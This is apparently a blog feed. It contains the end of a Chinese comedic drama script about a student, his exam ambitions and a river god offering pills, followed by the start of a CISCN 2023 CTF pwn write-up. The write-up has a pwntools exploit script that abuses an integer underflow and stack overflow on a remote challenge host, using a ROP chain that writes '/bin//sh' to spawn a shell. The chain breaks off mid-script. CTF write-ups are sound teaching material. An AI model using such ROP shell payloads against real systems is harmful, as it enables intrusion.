Âê´ÊÑüÊÉÖÂú∞Â§ßÂ£∞ÊúóËØªÔºâAÔºåAbandonÔºåÊîæÂºÉ„ÄÇ</p><p>Âç∑ÔºàÊÑ§ÊÄíÂú∞ÔºâÔºöÂìéÂë¶‰Ω†Âπ≤ÂòõÔºàÊä¢ËøáÂçïËØç‰π¶ÁªôÁ®ãÔºâÔºå‰∫∫ÁöÑËΩ¨ÂèòÊÄªÊòØË¶ÅÁÇπÊó∂Èó¥ÈÄÇÂ∫î„ÄÇÂÉè‰Ω†ËøôÊ†∑ÊÄ•ÂäüËøëÂà©Ôºå‰ªÄ‰πà‰∫ã‰πüÂÅö‰∏çÊàê„ÄÇÔºàËΩ¨Â§¥ÁúãÂêëÁ®ãÔºåÊ∏©ÊüîËÄåÂùöÂÆöÂú∞ÔºâÊàë‰ª¨‰∏ÄËµ∑Ôºå‰∏∫‰∫ÜÊ¢¶ÊÉ≥Â•ãÊñóÂêß„ÄÇ</p><p>Á®ãÁÇπÁÇπÂ§¥ÔºåÁúº‰∏≠ÊúâÂ∏åÊúõÁöÑÂÖâ„ÄÇ</p><h2 id="2-1-ÂÜÖÊôØÔºåËá™‰π†ÂÆ§"><a href="#2-1-ÂÜÖÊôØÔºåËá™‰π†ÂÆ§" class="headerlink" title="2-1 ÂÜÖÊôØÔºåËá™‰π†ÂÆ§"></a>2-1 ÂÜÖÊôØÔºåËá™‰π†ÂÆ§</h2><p>ÈïúÂ§¥Ê≠£ÂØπÂ≠¶‰π†‰∏≠ÁöÑÁ®ãÔºåÂÄçÈÄüÊí≠ÊîæÁ®ãÂ≠¶‰π†ÁöÑ‰∏ÄÂ§©ÔºåÂÖâÁ∫øÁî±ÊöóÂà∞ÊòéÂÜçÂà∞ÊöóÔºåÊ°åÂ≠ê‰∏äÂ†ÜÁßØÁöÑ‰π¶‰∏ÄÂ†ÜÊÖ¢ÊÖ¢ÂáèÂ∞ëÔºåÂè¶‰∏ÄÂ†ÜÊÖ¢ÊÖ¢Â¢ûÂ§öÔºå‰ªñÁöÑË∫´Âêé‰∫∫Êù•‰∫∫ÂæÄ„ÄÇÁ®ã‰∏ÄÁõ¥ÂüãÂ§¥Ëã¶Â≠¶„ÄÇ</p><p>Êôö‰∏äÔºåÂ•öÂ∞èÂΩ©ÈùôÈùôÊù•Âà∞‰ªñË∫´ËæπÔºåÊãç‰∫ÜÊãç‰ªñ</p><p>Á®ãÊÉäÔºöÂ•öÂ∞èÂΩ©Ôºü</p><p>Â•öÂ∞èÂΩ©ÂæÆÁ¨ëÁùÄÁ§∫ÊÑèÂíåÂ•π‰∏ÄËµ∑Âá∫Âéª„ÄÇ</p><p>Á®ãÊó†Â•àÂú∞Êëá‰∫ÜÊëáÂ§¥ÔºåÊåá‰∫ÜÊåáÂ†ÜÁßØÁöÑ‰π¶Á±ç„ÄÇ</p><p>Â•öÂ∞èÂΩ©Ëã¶Á¨ë„ÄÇ</p><h2 id="2-2-Â§ñÊôØÔºå‰ΩìËÇ≤Âú∫ËæπÁöÑÈÅìË∑Ø‰∏ä"><a href="#2-2-Â§ñÊôØÔºå‰ΩìËÇ≤Âú∫ËæπÁöÑÈÅìË∑Ø‰∏ä" class="headerlink" title="2-2 Â§ñÊôØÔºå‰ΩìËÇ≤Âú∫ËæπÁöÑÈÅìË∑Ø‰∏ä"></a>2-2 Â§ñÊôØÔºå‰ΩìËÇ≤Âú∫ËæπÁöÑÈÅìË∑Ø‰∏ä</h2><p>Á®ã‰∏æÁùÄÊâãÊú∫ÊÖ¢Ë∑ëÔºåÈïúÂ§¥ËøéÁùÄÁ®ãÔºå‰øùÊåÅÁ®ãÂú®ÁîªÈù¢‰∏≠ÂøÉ„ÄÇ</p><p>ÊóÅËæπËµ∞Êù•‰∏Ä‰∏™ÊãøÁùÄÁØÆÁêÉÁöÑÂÖÑÂºüÊãõÂëº‰ªñÊâìÁØÆÁêÉÔºåÁ®ãÊëÜÊëÜÊâãÔºå‰∏æËµ∑Êâã‰∏≠ÁöÑ‰πêÂÅ•Á§∫ÊÑè</p><p>ÊóÅËæπËµ∞Êù•‰∏Ä‰∏™ÊãøÁùÄ‰πí‰πìÁêÉÊãçÁöÑÂÖÑÂºüÊãõÂëº‰ªñÊâì‰πí‰πìÁêÉÔºåÁ®ãÊëÜÊëÜÊâãÔºå‰∏æËµ∑Êâã‰∏≠ÁöÑ‰πêÂÅ•Á§∫ÊÑè</p><p>ÊóÅËæπËµ∞Êù•‰∏Ä‰∏™ÊãøÁùÄÁæΩÊØõÁêÉÊãçÁöÑÂÖÑÂºüÊãõÂëº‰ªñÊâìÁæΩÊØõÁêÉÔºåÁ®ãÊëÜÊëÜÊâãÔºå‰∏æËµ∑Êâã‰∏≠ÁöÑ‰πêÂÅ•Á§∫ÊÑè</p><h2 id="2-3-Â§ñÊôØÔºåÂ§úÊôöÔºåÈïøÊ§Ö‰∏ä"><a href="#2-3-Â§ñÊôØÔºåÂ§úÊôöÔºåÈïøÊ§Ö‰∏ä" class="headerlink" title="2-3 Â§ñÊôØÔºåÂ§úÊôöÔºåÈïøÊ§Ö‰∏ä"></a>2-3 Â§ñÊôØÔºåÂ§úÊôöÔºåÈïøÊ§Ö‰∏ä</h2><p>Á®ãÊãøÁùÄËØæÊú¨Êª°ÊÄÄÊÑüÊÉÖÂú∞Â§ßÂ£∞ÊúóËØªÔºöwhere there is a willÔºåthere is a way</p><p>Á™ÅÁÑ∂ÊâãÊú∫Âìç‰∫ÜÔºåÂ•öÂΩ©ÂèëÊù•‰∏ÄÊù°ÂæÆ‰ø°ÔºöÊàë‰∏çÊÉ≥ËÄΩËØØ‰Ω†   Â∞±ËøôÊ†∑Âêß„ÄÇ</p><p>Á®ãÁúãÂêëÂ§©Á©∫ÔºåÈªëÊöó‰∏≠Áúã‰∏çÊ∏Ö‰ªñÁöÑËÑ∏„ÄÇ</p><h2 id="2-4-ÂÜÖÊôØÔºåÂÆøËàçÈáåÔºåÊ∏ÖÊô®"><a href="#2-4-ÂÜÖÊôØÔºåÂÆøËàçÈáåÔºåÊ∏ÖÊô®" class="headerlink" title="2-4 ÂÜÖÊôØÔºåÂÆøËàçÈáåÔºåÊ∏ÖÊô®"></a>2-4 ÂÜÖÊôØÔºåÂÆøËàçÈáåÔºåÊ∏ÖÊô®</h2><p>ÈïúÂ§¥ËêΩÂú®Êó•ÂéÜ‰∏äÔºåÂúàÂá∫‰∫Ü‰øùÁ†îÁªìÊûúÂÖ¨Â∏ÉÁöÑÊó•ÊúüÔºåÊ≠£ÊòØ‰ªäÂ§©„ÄÇ</p><p>Á®ãÈÜíÊù•ÔºåÂèëÁé∞ÊâãÊú∫ÈÇÆÁÆ±ÈáåÊî∂Âà∞‰∫ÜÊ∏ÖÂçéÂ§ßÂ≠¶ÁöÑoffer„ÄÇ</p><p>‰ªñÊÉäÂñúÂú∞Ê¨¢ÂëºÔºå‰ªñË∑É‰∏ãÂ∫äÔºöËäúÊπñÔºÅÂÖÑÂºü‰ª¨ÔºÅÊàëË¶Å‰∏äÊ∏ÖÂçé‰∫ÜÔºÅ</p><p>ÂèØÊòØÊ≤°Êúâ‰∫∫ÂõûÂ∫î</p><p>ÈïúÂ§¥Êâ´ËøáÂØùÂÆ§Ôºå‰∏§‰∏™ÂÆ§ÂèãÈÉΩ‰∏çÂú®ÔºåÂâ©‰∏ãÁöÑ‰∏Ä‰∏™Êà¥ÁùÄËÄ≥Êú∫Âú®ÊâìÊ∏∏Êàè„ÄÇ</p><p>Á®ãÊãçÊãçÂÆ§ÂèãÁöÑËÇ©ÔºåÂÆ§ÂèãÊëò‰∏ãËÄ≥Êú∫ÂõûÂ§¥ÔºåÁÑ∂ÂêéÂõûÂ§¥ÁªßÁª≠ÊâìÊ∏∏ÊàèÔºåÁ®ãÈóÆÔºöËÄÅÁéãÔºå‰ªñ‰ª¨‰∏§‰∏™‰∫∫Âë¢ÔºüËøô‰πàÊó©Â∞±‰∏çËßÅ‰∫ÜÔºü</p><p>ËÄÅÁéãÂ§¥‰πü‰∏çÂõûÔºö‰Ω†Âøò‰∫ÜÔºü‰ªäÂ§©ÊòØËÄÅÊùéÁîüÊó•ÔºåËÄÅÂº†Â∏¶ÁùÄ‰ªñÂ•≥ÊúãÂèã‰∏ÄËµ∑ÂéªÂ∏ÇÈáåÁªô‰ªñÂ∫ÜÁîü‰∫Ü„ÄÇ</p><p>Á®ãÔºöÈÇ£‰Ω†ÊÄé‰πàÊ≤°ÂéªÔºü</p><p>ËÄÅÁéãÔºöËøô‰∏çÂàöÊãøÂà∞ËèäËä±ÂéÇofferÔºåÂæÖ‰ºö‰∏ãÂçàË¶ÅÂéªÈÇ£ËæπÂØπÊé•‰∏Ä‰∏ãÂ∑•‰ΩúÔºåÂàÜË∫´‰πèÊúØÂïä„ÄÇ</p><p>Á®ãÁõÆÁû™Âè£ÂëÜ„ÄÇ</p><h1 id="Á¨¨‰∏âÂπï-Â§ñÊôØ-Ê≤≥Ëæπ"><a href="#Á¨¨‰∏âÂπï-Â§ñÊôØ-Ê≤≥Ëæπ" class="headerlink" title="Á¨¨‰∏âÂπï Â§ñÊôØ Ê≤≥Ëæπ"></a>Á¨¨‰∏âÂπï Â§ñÊôØ Ê≤≥Ëæπ</h1><p>‰∫∫Áâ©ÔºöÁ®ãÊôìÈùõÔºåÂç∑ÔºåÊëÜÔºåÊ≤≥Á•û</p><p>Ê≤≥Á•ûÂùêÂú®‰∏ÄËæπÔºåÁ®ãÊôìÈùõÂú®‰∏ÄËæπË∏±Ê≠•</p><p>Á®ãÔºö‰∫ãÊÉÖÂ∞±ÊòØËøôÊ†∑ÔºåÁªèËøáÂõõÂπ¥ÁöÑÂ•ãÊñóÔºåÊàëÁªà‰∫éËææÂà∞‰∫ÜËá™Â∑±ÁöÑÊ¢¶ÊÉ≥„ÄÇÂèØÊòØÁ´ôÂú®ÁªàÁÇπÂõûÊúõËøôÂõõÂπ¥ÁöÑÊóÖÈÄîÔºåÊàëÂ•ΩÂÉèÈîôËøá‰∫ÜÂ§™Â§öÈ£éÊôØÔºåÂ§±Âéª‰∫ÜÂ§™Â§öÁöÑÊóÖ‰º¥„ÄÇ</p><p>Ê≤≥Ôºö‰∫∫ÁîüÂ∞±ÊòØËøôÊ†∑ÂòõÔºåÂæóÂ§±ÂèÇÂçäÔºåÂÜçÂØªÂ∏∏‰∏çËøá„ÄÇ</p><p>Á®ãÔºàÊÑ§ÊÄíÔºâÔºö‰ΩÜËøô‰∏çÊòØÊàëÊÉ≥Ë¶ÅÁöÑÔºÅËøô‰∏çËØ•ÊòØÊàëÁöÑÂ§ßÂ≠¶ÁîüÊ¥ªÔºÅ</p><p>Ê≤≥Êó†Â•àÂú∞ÊëáÊëáÂ§¥Ôºå‰ªéÂè£Ë¢ãÈáåÊë∏Âá∫Á∫¢Ëìù‰∏§Á≤íËçØ‰∏∏ÔºöÊàëÁé∞Âú®Áªô‰Ω†‰∏ÄÊ¨°ÈáçÊñ∞ÈÄâÊã©ÁöÑÊú∫‰ºöÔºåÁ∫¢Ëâ≤ËçØ‰∏∏ËÉΩËÆ©‰Ω†ÈáçÊñ∞ÈÄâÊã©‰Ω†Ë¶ÅÊàê‰∏∫ÁöÑ‰∫∫ÔºåËìùËâ≤ËçØ‰∏∏‰ºöÂ∞Ü‰Ω†ËøáÂéªÁöÑÂõõÂπ¥Âåñ‰∏∫‰∫ëÁÉüÔºåËµ§ÊâãÁ©∫Êã≥Âú∞ÈáçÊñ∞ÂºÄÂßã„ÄÇ</p><p>ÊëÜÔºö‰Ω†ÁúãÈÇ£‰∏™ËÄÅÁéãÔºåÊàëÂ∞±Ê≤°ËßÅ‰ªñ‰∏äËøáÂá†ÂõûËØæÔºåÊØèÂ§©‰∏çÊòØÂá∫ÂéªËä±Â§©ÈÖíÂú∞Â∞±ÊòØÂú®ÂØùÂÆ§ÊâìÊ∏∏ÊàèÔºåÊúÄÂêéËøò‰∏çÊòØÈ°∫Âà©ÊãøÂà∞‰∫ÜËèäËä±ÂéÇÁöÑofferÔºüÊàëÁúãÂ∞±ÈÄâ‰ªñÂêß„ÄÇ</p><p>Âç∑ÔºöÊàë‰∏çÁõ∏‰ø°ÊúâËøôÊ†∑ÁöÑÂ•Ω‰∫ã‚Ä¶</p><p>ËØùÈü≥Êú™ËêΩÔºåÁ®ã‰∏äÂâçÂ∑≤ÁªèÊäìËµ∞‰∫ÜÁ∫¢Ëâ≤ËçØ‰∏∏Ôºå‰∏ÄÂè£Âêû‰∏ã„ÄÇ</p><p>ÁîªÈù¢‰∏ÄÈªë„ÄÇ</p><h1 id="Á¨¨ÂõõÂπï-ÂÜÖÊôØ-ÂÆøËàç"><a href="#Á¨¨ÂõõÂπï-ÂÜÖÊôØ-ÂÆøËàç" class="headerlink" title="Á¨¨ÂõõÂπï ÂÜÖÊôØ ÂÆøËàç"></a>Á¨¨ÂõõÂπï ÂÜÖÊôØ ÂÆøËàç</h1><p>‰∫∫Áâ©ÔºöÁ®ã Âç∑ ÊëÜ</p><p>Á®ãÂú®ÂÆøËàçÊâìÊ∏∏ÊàèÔºåÊâìÂá∫‰∏Ä‰∏™ÊºÇ‰∫ÆÁöÑ‰∫îÊùÄ</p><p>ÊëÜÔºàÂøÉÊª°ÊÑèË∂≥ÔºâÔºöÊàëËØ¥Âí±ËøôÂá†Âπ¥Ôºå‰∏çÂèóÈ´òÊï∞ÁöÑÊäòÁ£®ÔºåËÑëÁªÜËÉûÁöÑÂ≠òÊ¥ªÁéáÁúüÊòØÂ§ßÂπÖÊèêÂçá‰∫ÜÂïä„ÄÇ</p><p>Âç∑Ôºà‰∏çÂ±ëÔºâÔºöÊòØÂïäÔºå‰∏çÂéªÂõ¥ÁåéÁåõÁä∏Ë±°ÁúüÊòØÂüãÊ≤°‰∫∫Êâç‰∫Ü„ÄÇ</p><p>Á®ãÔºö‰Ω†Âà´ÁÆ°ÔºåËá≥Â∞ëÊàëËøôÂá†Âπ¥ËøáÁöÑÂÉèÁ•û‰ªô„ÄÇ</p><p>Âç∑ÔºàÈò¥Èò≥ÊÄ™Ê∞îÔºâÔºöÁ•û‰ªôÈ©¨‰∏äÂ∞±Ë¶ÅËÑ∏Êúù‰∏ãËêΩÂú∞ÂíØ„ÄÇ</p><p>ÊëÜÔºöÂà´ÔºåÂí±ÁöÑofferÂ∑≤ÁªèÂú®Ë∑Ø‰∏ä‰∫Ü„ÄÇ</p><p>Âç∑Ôºö‰Ω†‰πü‰∏çÁúã‰ªäÂ§©Âá†Âè∑‰∫ÜÔºüÊÇ®ËøôofferÊòØM87Êòü‰∫ëËµ∞Áî≥ÈÄöÂø´ÈÄíÂØÑÊù•ÁöÑÂêß</p><p>Á®ãÁúãÊó•ÂéÜÔºåÊÉä‰∫Ü</p><p>ÊëÜÔºöÂíãÂäû</p><p>Á®ãÔºöÊâæÈÇ£ËÄÅÂ§¥ÁêÜËÆ∫ÂéªÔºÅ</p><h1 id="Á¨¨‰∫îÂπï-Â§ñÊôØ-Ê≤≥Ëæπ"><a href="#Á¨¨‰∫îÂπï-Â§ñÊôØ-Ê≤≥Ëæπ" class="headerlink" title="Á¨¨‰∫îÂπï Â§ñÊôØ Ê≤≥Ëæπ"></a>Á¨¨‰∫îÂπï Â§ñÊôØ Ê≤≥Ëæπ</h1><p>‰∫∫Áâ©Ôºö Á®ã Âç∑ ÊëÜ Ê≤≥</p><p>Á®ãÂà∞Ê≤≥ËæπÁ†¥Âè£Â§ßÈ™ÇÔºöÁ≥üËÄÅÂ§¥Â≠êÔºÅÁªôÊàëÊªöÂá∫Êù•ÔºÅÊàëÁöÑofferÂë¢ÔºÅ</p><p>Ê≤≥Á•ûÂú®Ë∫´ÂêéÂá∫Áé∞ÔºåÈÇ™È≠Ö‰∏ÄÁ¨ëÔºö‰Ω†ÁàπÂèà‰∏çÊòØËèäËä±ÂéÇËÄÅÊùø</p><p>Á®ãÂáù‰Ωè„ÄÇ</p><p>ÈöèÂêéÊÑüÂà∞ÊÑ§ÊÄíÔºåÊ≠§Â§ÑÂ∫îÊúâÁôΩÈáë‰πãÊòüÂ§ÑÂàëÊõ≤ÂìçËµ∑ÔºåÁ®ãËΩ¨Ë∫´Èù¢ÂêëÊ≤≥Á•ûÔºåË∫´ÂêéÂá∫Áé∞ÊëÜÂíåÂç∑„ÄÇ</p><p>ÊëÜÔºåÂç∑ÔºöÊ¨ßÊãâÔºÅÔºà‰∏ÄÊã≥ÊâìÂÄíÊ≤≥Á•ûÔºâ</p><p>Á®ãÔºöÊúãÂèã‰ª¨ÔºåÊàëÊòéÁôΩ‰∫ÜÔºåÔºàËµ∞ËøëÊ≤≥Á•ûÂÄí‰∏ãÁöÑË∫´‰ΩìÔºâÔºåÊ≤°Êúâ‰∫∫ÂèØ‰ª•Â∏ÆÊàëÂÜ≥ÂÆöÊàëÁöÑÁîüÂëΩÔºå‰πüÊ≤°Êúâ‰∫∫ÂèØ‰ª•‰∏∫ÊàëÂ§±Ë¥•ÁöÑÈÄâÊã©Ë¥üË¥£ÔºàÂêåÊó∂ÂçïËÜùËπ≤‰∏ãÔºåÂú®Ê≤≥Á•ûË∫´‰∏äÊë∏Á¥¢ÔºåÊâæÂà∞ËìùËâ≤ËçØ‰∏∏ÔºâÔºåÊàëÊÉ≥ËøáÂ•ΩÊàëËá™Â∑±ÁöÑ‰∫∫ÁîüÔºà‰∏§Ê†πÊâãÊåá‰∏æËµ∑ËçØ‰∏∏ÔºåÂØπÁùÄÂ§™Èò≥ÁöÑÊñπÂêëÔºâ</p><p>Âç∑ÔºöÊè°Á¥ßÊØè‰∏ÄÂàÜÈíüÁöÑÁîüÂëΩ</p><p>ÊëÜÔºöÂáÜÂ§áËøéÊé•ÊØè‰∏Ä‰∏™ÂΩì‰∏ãÁöÑÁæéÂ•Ω</p><p>Á®ãÔºöÂØπËá™Â∑±ÁöÑ‰∏ÄÂàáË°å‰∏∫Ë¥üË¥£</p><p>‰∏â‰∫∫ÔºöÊó†ÊÄ®Êó†ÊÇî„ÄÇ</p><p>Á®ãÂêû‰∏ãËçØ‰∏∏ÔºåÁîªÈù¢‰∏ÄÈªë„ÄÇ</p><h1 id="Á¨¨ÂÖ≠Âπï"><a href="#Á¨¨ÂÖ≠Âπï" class="headerlink" title="Á¨¨ÂÖ≠Âπï"></a>Á¨¨ÂÖ≠Âπï</h1><p>‰∏éÁîªÈù¢ÂêåÊ≠•ÁöÑÊóÅÁôΩÔºö‚ÄúÈÇ£Êó∂ÂÄôÊàëÁ™ÅÁÑ∂ÊÑèËØÜÂà∞ÔºåÊØèÊù°Ê∫™ÊµÅÈÉΩÊúâËá™Â∑±ÁöÑËΩ®ËøπÔºåÁªÜÂ∞èÁöÑ‰∏çÂøÖÂº∫Ê±ÇÊ∞îÂäøÁ£ÖÁ§¥ÔºåÈ´ò‰∫¢ÁöÑ‰∏çÂøÖÁæ°ÊÖïÂÆõËΩ¨ËΩªÁõà„ÄÇÊàëÊú¨Êù•Â∞±‰∏çÂøÖÊàê‰∏∫‰ªª‰Ωï‰∫∫ÔºåÊàëÂè™Ë¶ÅÂÅöÔºåÂΩì‰∏ãÊúÄÂ•ΩÁöÑËá™Â∑±„ÄÇ</p><h2 id="6-1-Á®ãÊôìÈùõÂú®Ëá™‰π†ÂÆ§ÂíåÂêåÂ≠¶ÁÉ≠ÁÅ´ÊúùÂ§©Âú∞ËÆ®ËÆ∫Êï∞Â≠¶ÈóÆÈ¢ò"><a href="#6-1-Á®ãÊôìÈùõÂú®Ëá™‰π†ÂÆ§ÂíåÂêåÂ≠¶ÁÉ≠ÁÅ´ÊúùÂ§©Âú∞ËÆ®ËÆ∫Êï∞Â≠¶ÈóÆÈ¢ò" class="headerlink" title="6-1 Á®ãÊôìÈùõÂú®Ëá™‰π†ÂÆ§ÂíåÂêåÂ≠¶ÁÉ≠ÁÅ´ÊúùÂ§©Âú∞ËÆ®ËÆ∫Êï∞Â≠¶ÈóÆÈ¢ò"></a>6-1 Á®ãÊôìÈùõÂú®Ëá™‰π†ÂÆ§ÂíåÂêåÂ≠¶ÁÉ≠ÁÅ´ÊúùÂ§©Âú∞ËÆ®ËÆ∫Êï∞Â≠¶ÈóÆÈ¢ò</h2><h2 id="6-2-Á®ãÊôìÈùõÂíåÂ•öÂ∞èÂΩ©Âú®Â§úÊôöÁöÑÁÅØÂÖâ‰∏ãÊº´Ê≠•ÔºåËµ∞Âà∞‰πãÂâçÔºà2-3ÔºâÁ®ãÊôìÈùõÂàÜÊâãÁöÑ‰ΩçÁΩÆÊó∂Ôºå‰∏§‰∫∫Á™ÅÁÑ∂Áõ∏ËßÜ‰∏ÄÁ¨ë"><a href="#6-2-Á®ãÊôìÈùõÂíåÂ•öÂ∞èÂΩ©Âú®Â§úÊôöÁöÑÁÅØÂÖâ‰∏ãÊº´Ê≠•ÔºåËµ∞Âà∞‰πãÂâçÔºà2-3ÔºâÁ®ãÊôìÈùõÂàÜÊâãÁöÑ‰ΩçÁΩÆÊó∂Ôºå‰∏§‰∫∫Á™ÅÁÑ∂Áõ∏ËßÜ‰∏ÄÁ¨ë" class="headerlink" title="6-2 Á®ãÊôìÈùõÂíåÂ•öÂ∞èÂΩ©Âú®Â§úÊôöÁöÑÁÅØÂÖâ‰∏ãÊº´Ê≠•ÔºåËµ∞Âà∞‰πãÂâçÔºà2-3ÔºâÁ®ãÊôìÈùõÂàÜÊâãÁöÑ‰ΩçÁΩÆÊó∂Ôºå‰∏§‰∫∫Á™ÅÁÑ∂Áõ∏ËßÜ‰∏ÄÁ¨ë"></a>6-2 Á®ãÊôìÈùõÂíåÂ•öÂ∞èÂΩ©Âú®Â§úÊôöÁöÑÁÅØÂÖâ‰∏ãÊº´Ê≠•ÔºåËµ∞Âà∞‰πãÂâçÔºà2-3ÔºâÁ®ãÊôìÈùõÂàÜÊâãÁöÑ‰ΩçÁΩÆÊó∂Ôºå‰∏§‰∫∫Á™ÅÁÑ∂Áõ∏ËßÜ‰∏ÄÁ¨ë</h2><h2 id="6-3-Á®ãÊôìÈùõÂú®Ë∂≥ÁêÉÂú∫‰∏äÂ•îË∑ëÔºå‰∏Ä‰∏™Â∏ÖÊ∞îÁöÑÂ∞ÑÈó®ÔºåÁêÉËøõ‰∫ÜÔºåÂ•öÂ∞èÂΩ©Ê¨¢Âëº„ÄÇ"><a href="#6-3-Á®ãÊôìÈùõÂú®Ë∂≥ÁêÉÂú∫‰∏äÂ•îË∑ëÔºå‰∏Ä‰∏™Â∏ÖÊ∞îÁöÑÂ∞ÑÈó®ÔºåÁêÉËøõ‰∫ÜÔºåÂ•öÂ∞èÂΩ©Ê¨¢Âëº„ÄÇ" class="headerlink" title="6-3 Á®ãÊôìÈùõÂú®Ë∂≥ÁêÉÂú∫‰∏äÂ•îË∑ëÔºå‰∏Ä‰∏™Â∏ÖÊ∞îÁöÑÂ∞ÑÈó®ÔºåÁêÉËøõ‰∫ÜÔºåÂ•öÂ∞èÂΩ©Ê¨¢Âëº„ÄÇ"></a>6-3 Á®ãÊôìÈùõÂú®Ë∂≥ÁêÉÂú∫‰∏äÂ•îË∑ëÔºå‰∏Ä‰∏™Â∏ÖÊ∞îÁöÑÂ∞ÑÈó®ÔºåÁêÉËøõ‰∫ÜÔºåÂ•öÂ∞èÂΩ©Ê¨¢Âëº„ÄÇ</h2>]]></content>
    
    
    <summary type="html">Âõæ‰∏Ä‰πê</summary>
    
    
    
    <category term="literature" scheme="http://deepunk.icu/categories/literature/"/>
    
    
    <category term="literature" scheme="http://deepunk.icu/tags/literature/"/>
    
    <category term="drama" scheme="http://deepunk.icu/tags/drama/"/>
    
  </entry>
  
  <entry>
    <title>ciscn2023pwnÂÆùÂÆùÈ¢òËß£</title>
    <link href="http://deepunk.icu/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3/"/>
    <id>http://deepunk.icu/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3/</id>
    <published>2023-05-29T15:26:54.000Z</published>
    <updated>2023-12-09T07:11:23.568Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ÂùêÁâ¢‰∫ÜÔºåÂè™‰ºöÂÅöbabyÈ¢ò</p></blockquote><h1 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a>shaokao</h1><p>Êï¥Âûã‰∏ãÊ∫¢ÔºåÁÑ∂ÂêéÊúâ‰∏™Ê†àÊ∫¢Âá∫ÔºåÁõ¥Êé•Áî®ROPgadgetÁîüÊàêropchain</p><p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173718539.png" alt="image-20230528173718539"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;123.56.251.120&quot;</span></span><br><span class="line">port = <span class="number">36293</span></span><br><span class="line"><span class="comment">#pl = process(&quot;./shaokao&quot;)</span></span><br><span class="line">pl = remote(host,  port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line">pl.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line">pl.sendline(<span class="string">&quot;-1145144&quot;</span>)</span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">pl.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">pl.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">pl.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="string">b&quot;a&quot;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += p64(<span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x0000000000447339</span>) 